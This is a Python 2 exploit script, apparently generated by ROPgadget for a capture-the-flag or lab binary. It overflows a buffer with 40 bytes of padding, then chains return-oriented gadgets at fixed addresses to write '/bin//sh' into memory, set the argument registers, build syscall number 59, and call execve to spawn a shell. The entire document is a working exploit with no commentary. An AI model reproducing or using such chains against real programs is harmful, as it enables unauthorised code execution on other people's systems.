#!/usr/bin/env python2
# execve generated by ROPgadget

from struct import pack

# Padding goes here
p = ''
	
p += 'a'*40
p += pack('<Q', 0x00000000004017a7) # pop rsi ; ret
p += pack('<Q', 0x00000000006c0060) # @ .data
p += pack('<Q', 0x000000000044d0f4) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x0000000000467991) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004017a7) # pop rsi ; ret
p += pack('<Q', 0x00000000006c0068) # @ .data + 8
p += pack('<Q', 0x000000000041bbdf) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000467991) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401693) # pop rdi ; ret
p += pack('<Q', 0x00000000006c0060) # @ .data
p += pack('<Q', 0x00000000004017a7) # pop rsi ; ret
p += pack('<Q', 0x00000000006c0068) # @ .data + 8
p += pack('<Q', 0x0000000000437045) # pop rdx ; ret
p += pack('<Q', 0x00000000006c0068) # @ .data + 8
p += pack('<Q', 0x000000000041bbdf) # xor rax, rax ; ret


p += pack('<Q', 0x000000000045a860) # add rax, 3 ; ret
p += pack('<Q', 0x000000000045a860) # add rax, 3 ; ret
p += pack('<Q', 0x000000000045a860) # add rax, 3 ; ret
p += pack('<Q', 0x000000000045a860) # add rax, 3 ; ret
p += pack('<Q', 0x000000000045a860) # add rax, 3 ; ret
p += pack('<Q', 0x000000000045a860) # add rax, 3 ; ret
p += pack('<Q', 0x000000000045a860) # add rax, 3 ; ret
p += pack('<Q', 0x000000000045a860) # add rax, 3 ; ret
p += pack('<Q', 0x000000000045a860) # add rax, 3 ; ret
p += pack('<Q', 0x000000000045a860) # add rax, 3 ; ret
p += pack('<Q', 0x000000000045a860) # add rax, 3 ; ret
p += pack('<Q', 0x000000000045a860) # add rax, 3 ; ret
p += pack('<Q', 0x000000000045a860) # add rax, 3 ; ret
p += pack('<Q', 0x000000000045a860) # add rax, 3 ; ret
p += pack('<Q', 0x000000000045a860) # add rax, 3 ; ret
p += pack('<Q', 0x000000000045a860) # add rax, 3 ; ret
p += pack('<Q', 0x000000000045a860) # add rax, 3 ; ret
p += pack('<Q', 0x000000000045a860) # add rax, 3 ; ret
p += pack('<Q', 0x000000000045a860) # add rax, 3 ; ret
p += pack('<Q', 0x000000000045a850) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045a850) # add rax, 1 ; ret

p += pack('<Q', 0x000000000045b365) # syscall ; ret
print p
